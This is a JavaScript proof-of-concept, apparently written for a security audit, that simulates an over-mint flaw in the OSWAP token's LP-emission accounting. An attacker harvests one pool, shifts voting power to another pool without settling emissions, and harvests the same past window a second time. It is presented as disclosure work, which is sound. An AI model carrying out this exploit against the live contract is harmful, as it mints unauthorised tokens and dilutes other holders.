/*
 * PoC (numerical simulation) — OSWAP token AA over-mint of LP emissions.
 *
 * Faithfully replicates the emission-accounting functions from oswap-lib.oscript:
 *   $update_total_emissions  (lib:39-46)
 *   $distribute_lp_emissions (lib:61-85)   [pool-stage + LP-stage]
 *   $increase_supply         (lib:9-20)
 * and the ORDER OF OPERATIONS from oswap.oscript:
 *   deposit / withdraw_lp_reward  -> DOES call $distribute_lp_emissions (oscript:433)
 *   vote_shares                   -> does NOT settle emissions (oscript:487 only $apply_vote)
 *
 * Invariant that SHOULD hold: total OSWAP minted as LP emissions == state.lp_emissions
 * (the scheduled cumulative LP-emission budget). The attack breaks it.
 *
 * Attack: attacker is the sole staker (VP=100) and the sole LP of two whitelisted
 * pools X and Y. VP is on X for a full year (Y has share 0 the whole time). At year
 * end the attacker harvests X (legit), then MOVES all VP to Y via vote_shares (no
 * settle) and harvests Y — Y now claims the SAME past-year window at share 1, even
 * though it had share 0 all year. The window is double-counted => over-mint.
 */

const YEAR = 31104000; // 360*24*3600, per lib:4
const props = { inflation_rate: 0.1, stakers_share: 0.5 };

// --- global protocol state (only emission-relevant fields) ---
const state = {
  supply: 1_000_000,        // token units
  total_normalized_vp: 100, // attacker is the ONLY staker => share can reach 1
  last_emissions_ts: 0,
  stakers_emissions: 0,
  lp_emissions: 0,
  _minted_lp: 0,            // instrumentation: total minted via LP increase_supply
};

// pools, keyed by asset_key
const pools = {
  aX: { asset_key: 'aX', last_lp_emissions: 0, received_emissions: 0, blacklisted: false },
  aY: { asset_key: 'aY', last_lp_emissions: 0, received_emissions: 0, blacklisted: false },
};
// current voting-power allocation across pools (sums to total_normalized_vp)
const pool_vps = { aX: 100, aY: 0 };

// attacker's LP position in each pool (sole LP => balance == total_lp_balance)
const lps = {
  aX: { balance: 1000, last_pool_emissions: 0, reward: 0 },
  aY: { balance: 1000, last_pool_emissions: 0, reward: 0 },
};

function update_total_emissions(ts) { // lib:39-46
  const total_new = state.total_normalized_vp
    ? (ts - state.last_emissions_ts) / YEAR * props.inflation_rate * state.supply
    : 0;
  state.last_emissions_ts = ts;
  state.stakers_emissions += props.stakers_share * total_new;
  state.lp_emissions += (1 - props.stakers_share) * total_new;
}

// lib:61-85, with $total_lp_balance == lp.balance (sole LP)
function distribute_lp_emissions(poolKey, ts) {
  const pool = pools[poolKey];
  const lp = lps[poolKey];
  update_total_emissions(ts);
  if (!state.total_normalized_vp) return;
  if (!pool.blacklisted) {
    const pool_share = pool_vps[pool.asset_key] / state.total_normalized_vp;      // sampled NOW
    const window = state.lp_emissions - pool.last_lp_emissions;                    // whole un-settled window
    pool.last_lp_emissions = state.lp_emissions;
    pool.received_emissions += window * pool_share;                               // <-- past window priced at current share
  }
  const new_since = pool.received_emissions - lp.last_pool_emissions;
  lp.last_pool_emissions = pool.received_emissions;
  const total_lp_balance = lp.balance; // sole LP
  if (lp.balance && total_lp_balance) {
    const reward = new_since * lp.balance / total_lp_balance; // == new_since (100%)
    lp.reward += reward;
    state._minted_lp += reward; // increase_supply mints exactly `reward` of LP emission
  }
}

function harvest(poolKey, ts) { // withdraw_lp_reward: settle then zero reward (oscript:433,464)
  distribute_lp_emissions(poolKey, ts);
  const paid = Math.floor(lps[poolKey].reward);
  lps[poolKey].reward = 0;
  return paid;
}

function vote_shares_move(fromKey, toKey, amount) { // oscript:487 -> $apply_vote ONLY (no settle)
  pool_vps[fromKey] -= amount;
  pool_vps[toKey]   += amount;
}

// ---- timeline ----
// t0: deposits already settled at ts=0 (received=0). VP is 100% on X.
distribute_lp_emissions('aX', 0);
distribute_lp_emissions('aY', 0);

// one full year passes with VP entirely on X (Y's true share = 0 all year)
const t1 = YEAR;

// (1) harvest X — legitimate: X held share 1 for the whole year
const paidX = harvest('aX', t1);

// (2) move ALL VP X->Y with vote_shares (NO settle), then harvest Y
vote_shares_move('aX', 'aY', 100);
const paidY = harvest('aY', t1);

// ---- results ----
const scheduled = state.lp_emissions;          // total LP emission the schedule authorized
const minted    = state._minted_lp;            // total actually minted to the attacker
console.log('Scheduled cumulative LP emissions (lp_emissions):', scheduled);
console.log('Paid to attacker from pool X (legit):           ', paidX);
console.log('Paid to attacker from pool Y (stolen window):   ', paidY);
console.log('TOTAL minted LP emissions:                      ', minted);
console.log('Over-mint (minted - scheduled):                 ', minted - scheduled);
console.log('Over-mint ratio:                                ', (minted / scheduled).toFixed(2) + 'x');
console.log('\nWith N sole-LP pools shuffled the same way, minted -> N x scheduled.');
